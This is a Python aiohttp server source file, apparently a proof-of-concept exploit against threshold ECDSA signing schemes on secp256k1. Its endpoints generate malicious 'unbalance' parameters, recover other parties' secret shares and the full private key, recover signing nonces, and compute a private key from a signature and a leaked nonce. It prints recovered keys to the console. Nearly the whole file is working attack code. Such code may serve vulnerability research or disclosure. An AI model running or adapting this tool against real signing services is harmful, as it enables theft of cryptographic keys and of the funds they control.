import dataclasses
from typing import Dict, Set
from _types import Exploiter
from exploiter_unbalance import UnbalanceExploiter
import logging
from aiohttp import web
from _util import secp256k1_scalar_base_mult, SECP256K1_Q

exploiters: Dict[int, Exploiter] = {}


async def handle_gen_params(request: web.Request) -> web.Response:
    t = request.query.get("type", "square")
    k = int(request.query.get("dlog_proof_repeat", "128"))
    if t == "unbalance":
        exploiter = UnbalanceExploiter(k)
    else:
        raise web.HTTPBadRequest
    params = exploiter.params()
    exploiters[params.N] = exploiter
    return web.json_response(dataclasses.asdict(params))


async def handle_get_params(request: web.Request) -> web.Response:
    N = int(request.query.get("N", "0"))
    if N == 0:
        raise web.HTTPBadRequest
    if N not in exploiters:
        raise web.HTTPNotFound
    return web.json_response(dataclasses.asdict(exploiters[N].params()))


async def handle_recover_shares(request: web.Request) -> web.Response:
    data = await request.json()
    if 'N' not in data:
        raise web.HTTPBadRequest
    if data['N'] not in exploiters:
        raise web.HTTPNotFound
    shares, private_key = exploiters[data['N']].recover_shares(data['self_x'], data['self_share'], data['xz'])
    print("Shares:")
    for (xi, _), si in zip(data['xz'], shares):
        print(xi, si)
    print("Private key:", private_key)
    return web.json_response({"shares": shares, "private_key": private_key})


nonces: Set[int] = set()


async def handle_recover_nonce(request: web.Request) -> web.Response:
    data = await request.json()
    if 'N' not in data:
        raise web.HTTPBadRequest
    if data['N'] not in exploiters:
        raise web.HTTPNotFound
    nonce = exploiters[data['N']].recover_nonce(data['self_k'], data['z'])
    print("Nonce recovered:", nonce)
    nonces.add(nonce)
    return web.json_response({"nonce": nonce})


async def handle_lookup_private_key(request: web.Request) -> web.Response:
    m = int(request.query.get("m", "0"))
    r = int(request.query.get("r", "0"))
    s = int(request.query.get("s", "0"))
    pkx = int(request.query.get("pkx", "0"))
    pky = int(request.query.get("pky", "0"))
    if any(x == 0 for x in [m, r, s, pkx, pky]):
        raise web.HTTPBadRequest

    found_nonce = 0
    for nonce in nonces:
        _r, _ = secp256k1_scalar_base_mult(nonce)
        if _r == r:
            found_nonce = nonce
            break
    if not found_nonce:
        raise web.HTTPNotFound

    nonces.remove(found_nonce)
    for _s in [s, -s]:
        private_key = (found_nonce * _s - m) * pow(r, -1, SECP256K1_Q) % SECP256K1_Q
        x, y = secp256k1_scalar_base_mult(private_key)
        if x == pkx and y == pky:
            print("Recovered private key:", private_key)
            print("Corresponding public key:", x, y)
            return web.json_response({"private_key": private_key})

    raise web.HTTPNotFound


if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    app = web.Application()
    app.add_routes([web.get('/params', handle_get_params)])
    app.add_routes([web.get('/gen-params', handle_gen_params)])
    app.add_routes([web.post('/recover-shares', handle_recover_shares)])
    app.add_routes([web.post('/recover-nonce', handle_recover_nonce)])
    app.add_routes([web.get('/lookup-private-key', handle_lookup_private_key)])
    web.run_app(app, port=1337, access_log_format='%a %t %Tf "%r" %s %b "%{Referer}i" "%{User-Agent}i"')
